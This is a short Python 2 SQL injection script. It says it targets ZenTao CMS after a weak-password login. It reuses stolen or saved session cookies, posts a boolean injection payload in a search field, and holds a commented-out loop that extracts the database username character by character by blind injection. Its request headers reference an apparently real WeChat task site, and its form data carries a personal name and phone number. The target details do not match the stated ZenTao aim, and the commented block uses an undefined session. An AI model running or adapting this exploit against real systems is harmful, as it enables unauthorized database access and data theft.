#!/usr/bin/env python
# coding=utf-8
#zentaocms弱口令登录后的注入，需要维持session。

import re
import sys
import time
import requests
from termcolor import cprint

reload(sys)
sys.setdefaultencoding('utf-8')
headers = {
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
    "Content-Type":"application/x-www-form-urlencoded",
    "Referer":"http://wxtest.cic.cn/CICWechat/weixin/newtask.do?mhd=toList&orderFid=.C_TASK_STATE&orderType=asc",
}

f=open(r'cookies.txt','r')
cookies={}
for line in f.read().split(';'):
    name,value=line.strip().split('=',1)  
    cookies[name]=value

post_data = {
    "mhd":"toList",
    "searchValue":"16% and 1=2 and '%'='",
    "searchReporter":"%E7%8E%8B%E6%B3%89%E6%98%8C%25",
    "searchRepprterMobile":"15140671412",
    "accountParam":"gh_8e4a57db8d77",
    "mod":"no",
    "orderType":"asc",
    "orderFid":".C_TASK_STATE",
    "currentPage":"1",
    "paginationAction":"",
    "pageSelect":"",
}

res = requests.post("http://test/index.do", data=post_data, timeout=10, cookies=cookies)
print len(res.text)
'''
url = "http://test.com/zentaopms/www/?m=my&f=bug&type=1"
key = ""
for j in range(1, 20, 1):
    for i in range(1, 200, 1):
        payload = url + "%20AND%20ASCII(SUBSTRING(user(),"+str(j)+",1))%3d"+str(i)+"%23"
        req = session.get(payload, headers=headers)
        if req.text.find("蓝牙连接") is not -1:
            key += chr(i)
            break
        else:
            pass
    print "用户名:"+key
'''